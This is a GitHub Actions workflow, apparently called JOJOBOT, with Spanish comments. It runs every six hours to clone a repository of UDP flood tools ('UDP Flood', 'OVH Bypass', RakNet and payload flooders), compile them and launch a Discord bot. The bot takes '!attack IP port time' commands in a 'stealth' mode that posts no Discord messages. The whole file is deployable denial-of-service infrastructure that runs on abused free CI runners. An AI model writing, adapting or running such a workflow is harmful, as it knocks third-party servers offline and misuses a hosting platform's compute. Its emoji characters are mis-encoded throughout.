name: JOJOBOT

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'  # Cada 6 horas

jobs:
  clone-compile-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: üóëÔ∏è Limpiar directorio anterior
      run: |
        echo "Limpiando directorios anteriores..."
        rm -rf BotUDPs 2>/dev/null || true
        ls -la
    
    - name: üì• Clonar repositorio
      run: |
        echo "Clonando repositorio BotUDPs..."
        git clone https://github.com/zJonch14/BotUDPs.git
        
        if [ ! -d "BotUDPs" ]; then
          echo "ERROR: No se pudo clonar el repositorio"
          exit 1
        fi
        
        cd BotUDPs
        echo "‚úÖ Repositorio clonado en: $(pwd)"
        echo "Contenido inicial:"
        ls -la
    
    - name: üêç Configurar Python 3.11
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: ü¶æ Configurar Go 1.21
      uses: actions/setup-go@v4
      with:
        go-version: '1.21'
    
    - name: üîß Instalar herramientas de compilaci√≥n
      run: |
        echo "Instalando herramientas necesarias..."
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make libpcap-dev
        echo "‚úÖ Herramientas instaladas"
    
    - name: üì¶ Instalar discord.py
      run: |
        cd BotUDPs
        echo "Instalando discord.py..."
        pip install discord.py
        echo "‚úÖ discord.py instalado"
    
    - name: üìö Configurar dependencias Go
      run: |
        cd BotUDPs
        echo "Configurando dependencias Go..."
        
        # Crear go.mod si no existe
        if [ ! -f "go.mod" ]; then
          go mod init bot-udps 2>/dev/null || true
        fi
        
        # Instalar dependencias para raknet.go
        go get github.com/sandertv/go-raknet 2>/dev/null || echo "‚ö†  Dependencia go-raknet"
        go get github.com/sirupsen/logrus 2>/dev/null || echo "‚ö†  Dependencia logrus"
        
        echo "‚úÖ Dependencias Go configuradas"
    
    - name: üõ†Ô∏è Compilar TODOS los binarios C
      run: |
        cd BotUDPs
        echo "========================================"
        echo "COMPILANDO TODOS LOS BINARIOS C"
        echo "========================================"
        
        # Crear lista de m√©todos C a compilar
        declare -A c_programs=(
          ["udp.c"]="UDP Flood"
          ["udphex.c"]="UDPHEX"
          ["udppps.c"]="UDPPPS"
          ["ovh.c"]="OVH Bypass"
          ["udppayload.c"]="UDP Payload"
        )
        
        compiled=0
        failed=0
        
        for source_file in "${!c_programs[@]}"; do
          echo ""
          echo "üî® ${c_programs[$source_file]} ($source_file)"
          
          if [ -f "$source_file" ]; then
            binary="${source_file%.c}"
            
            # Compilar seg√∫n el tipo de archivo
            if [ "$source_file" == "ovh.c" ]; then
              # OVH necesita libpcap
              gcc -O3 -pthread "$source_file" -o "$binary" -lpcap 2>/dev/null
            else
              # Otros m√©todos
              gcc -O3 -pthread "$source_file" -o "$binary" 2>/dev/null
            fi
            
            if [ -f "$binary" ]; then
              chmod +x "$binary"
              echo "  ‚úÖ $binary compilado exitosamente"
              ((compiled++))
            else
              echo "  ‚ùå Error compilando $binary"
              ((failed++))
            fi
          else
            echo "  ‚ùå $source_file no encontrado"
            ((failed++))
          fi
        done
        
        echo ""
        echo "========================================"
        echo "RESULTADO COMPILACI√ìN:"
        echo "  ‚úÖ $compiled compilados correctamente"
        echo "  ‚ùå $failed con errores"
        echo ""
        echo "EJECUTABLES DISPONIBLES:"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | xargs -I {} basename {} 2>/dev/null || echo "  Ninguno"
        echo "========================================"
    
    - name: üîç Verificar scripts Go
      run: |
        cd BotUDPs
        echo "========================================"
        echo "VERIFICANDO SCRIPTS GO"
        echo "========================================"
        
        # Verificar udpflood.go
        if [ -f "udpflood.go" ]; then
          echo "‚úÖ udpflood.go encontrado"
          # Probar compilaci√≥n
          if go build -o /tmp/udpflood_test udpflood.go 2>/dev/null; then
            echo "  ‚úì Compila correctamente"
            rm -f /tmp/udpflood_test
          else
            echo "  ‚ö†  Posibles errores de compilaci√≥n"
          fi
        else
          echo "‚ùå udpflood.go NO encontrado"
        fi
        
        # Verificar raknet.go
        if [ -f "raknet.go" ]; then
          echo "‚úÖ raknet.go encontrado"
          # Probar compilaci√≥n
          if go build -o /tmp/raknet_test raknet.go 2>/dev/null; then
            echo "  ‚úì Compila correctamente"
            rm -f /tmp/raknet_test
          else
            echo "  ‚ö†  Posibles errores de compilaci√≥n"
          fi
        else
          echo "‚ùå raknet.go NO encontrado"
        fi
        
        echo "========================================"
    
    - name: üîê Configurar token DESDE SECRET KEYS
      env:
        DISCORD_TOKEN: ${{ secrets.KEYS }}
      run: |
        cd BotUDPs
        echo "========================================"
        echo "CONFIGURANDO TOKEN DESDE SECRET 'KEYS'"
        echo "========================================"
        
        if [ -z "$DISCORD_TOKEN" ]; then
          echo ""
          echo "‚ùå‚ùå‚ùå ERROR CR√çTICO ‚ùå‚ùå‚ùå"
          echo "NO SE ENCONTR√ì EL SECRET 'KEYS'"
          echo ""
          echo "Para solucionar:"
          echo "1. Ve a tu repositorio en GitHub"
          echo "2. Haz clic en 'Settings'"
          echo "3. Selecciona 'Secrets and variables' ‚Üí 'Actions'"
          echo "4. Haz clic en 'New repository secret'"
          echo "5. Nombre: KEYS"
          echo "6. Valor: [PEGA TU TOKEN DE BOT DE DISCORD AQU√ç]"
          echo "7. Haz clic en 'Add secret'"
          echo ""
          echo "Sin este paso, el bot NO puede iniciar."
          exit 1
        fi
        
        # Validar formato b√°sico del token
        TOKEN_LENGTH=${#DISCORD_TOKEN}
        if [ $TOKEN_LENGTH -lt 50 ]; then
          echo "‚ö†  ADVERTENCIA: Token muy corto ($TOKEN_LENGTH caracteres)"
          echo "Un token v√°lido de Discord suele tener ~59 caracteres"
        fi
        
        # Guardar token en token.txt
        echo "$DISCORD_TOKEN" > token.txt
        
        # Verificar que se guard√≥ correctamente
        if [ -f "token.txt" ]; then
          ACTUAL_LENGTH=$(wc -c < token.txt | tr -d ' ')
          echo ""
          echo "‚úÖ TOKEN CONFIGURADO EXITOSAMENTE"
          echo "   Archivo: token.txt"
          echo "   Tama√±o: $ACTUAL_LENGTH caracteres"
          echo "   Vista previa: $(head -c 15 token.txt)..."
          
          # Proteger el archivo
          chmod 600 token.txt
        else
          echo "‚ùå ERROR: No se pudo crear token.txt"
          exit 1
        fi
        
        echo "========================================"
    
    - name: üìã Verificar estructura final
      run: |
        cd BotUDPs
        echo "========================================"
        echo "ESTRUCTURA FINAL DEL PROYECTO"
        echo "========================================"
        echo "Directorio: $(pwd)"
        echo ""
        
        echo "üìÑ ARCHIVOS PRINCIPALES:"
        echo "-----------------------"
        ls -la bot.py token.txt 2>/dev/null || echo "  ‚ùå Faltan archivos cr√≠ticos"
        echo ""
        
        echo "‚öôÔ∏è BINARIOS C COMPILADOS:"
        echo "-----------------------"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read file; do
          size=$(wc -c < "$file" 2>/dev/null | awk '{print $1}')
          echo "  ‚úì $(basename "$file") ($size bytes)"
        done
        
        echo ""
        echo "ü¶æ SCRIPTS GO:"
        echo "-------------"
        ls -la *.go 2>/dev/null | awk '{print "  " $9}' || echo "  No hay scripts Go"
        
        echo ""
        echo "üîß ARCHIVOS FUENTE C:"
        echo "-------------------"
        ls -la *.c 2>/dev/null | awk '{print "  " $9}' || echo "  No hay archivos .c"
        
        echo ""
        echo "‚úÖ VERIFICACI√ìN COMPLETADA"
        echo "========================================"
    
    - name: üöÄ EJECUTAR bot.py CONTINUAMENTE
      run: |
        cd BotUDPs
        echo "========================================"
        echo "üöÄ INICIANDO EJECUCI√ìN DEL BOT"
        echo "========================================"
        echo "Hora de inicio: $(date)"
        echo ""
        echo "üìã ESPECIFICACIONES:"
        echo "  ‚Ä¢ Repositorio: zJonch14/BotUDPs (clonado)"
        echo "  ‚Ä¢ Token: Configurado desde secret 'KEYS'"
        echo "  ‚Ä¢ Modo: Sigiloso (0 mensajes en Discord)"
        echo "  ‚Ä¢ Duraci√≥n: Hasta que GitHub detenga el runner (~6h)"
        echo ""
        echo "üéÆ M√âTODOS DISPONIBLES:"
        echo "  !attack udp [IP] [PUERTO] [TIEMPO]"
        echo "  !attack udphex [IP] [PUERTO] [TIEMPO]"
        echo "  !attack udppps [IP] [PUERTO] [TIEMPO]"
        echo "  !attack ovh [IP] [PUERTO] [TIEMPO]"
        echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
        echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
        echo "  !attack udppayload [IP] [PUERTO] [TIEMPO] [PAYLOAD]"
        echo ""
        echo "‚ö†Ô∏è  IMPORTANTE:"
        echo "  ‚Ä¢ El bot NO enviar√° mensajes a Discord"
        echo "  ‚Ä¢ Solo registrar√° actividad en esta consola"
        echo "  ‚Ä¢ Se ejecutar√° hasta el l√≠mite de GitHub"
        echo ""
        echo "========================================"
        
        # Verificaci√≥n final antes de ejecutar
        if [ ! -f "bot.py" ]; then
          echo "‚ùå ERROR CR√çTICO: bot.py no encontrado"
          exit 1
        fi
        
        if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
          echo "‚ùå ERROR CR√çTICO: token.txt no v√°lido"
          exit 1
        fi
        
        echo ""
        echo "‚úÖ TODO CONFIGURADO CORRECTAMENTE"
        echo "‚ö° INICIANDO BOT.PY..."
        echo ""
        echo "--------------------------------------------------"
        
        # EJECUTAR EL BOT INDEFINIDAMENTE
        # (Se detendr√° solo cuando GitHub cancele el job)
        python3 bot.py
        
        # Solo llegar√° aqu√≠ si el bot falla antes del timeout
        EXIT_CODE=$?
        echo ""
        echo "--------------------------------------------------"
        echo ""
        echo "‚ö†Ô∏è  EL BOT SE DETUVO ANTES DE LO ESPERADO"
        echo "‚è∞ Hora: $(date)"
        echo "üìä C√≥digo de salida: $EXIT_CODE"
        
        echo "========================================"
    
    - name: üìù Reporte final de ejecuci√≥n
      if: always()
      run: |
        echo "========================================"
        echo "üìä REPORTE FINAL DE EJECUCI√ìN"
        echo "========================================"
        echo "Workflow: ${{ github.workflow }}"
        echo "Run ID: ${{ github.run_id }}"
        echo "Repositorio fuente: zJonch14/BotUDPs"
        echo "Estado final: ${{ job.status }}"
        echo "Hora: $(date)"
        echo ""
        
        if [ -d "BotUDPs" ]; then
          cd BotUDPs
          echo "üìÅ CONTENIDO FINAL DEL DIRECTORIO:"
          echo "----------------------------------"
          ls -la 2>/dev/null | head -20 || echo "No se puede acceder al directorio"
        fi
        
        echo ""
        echo "‚úÖ PROCESO COMPLETADO"
        echo "========================================"
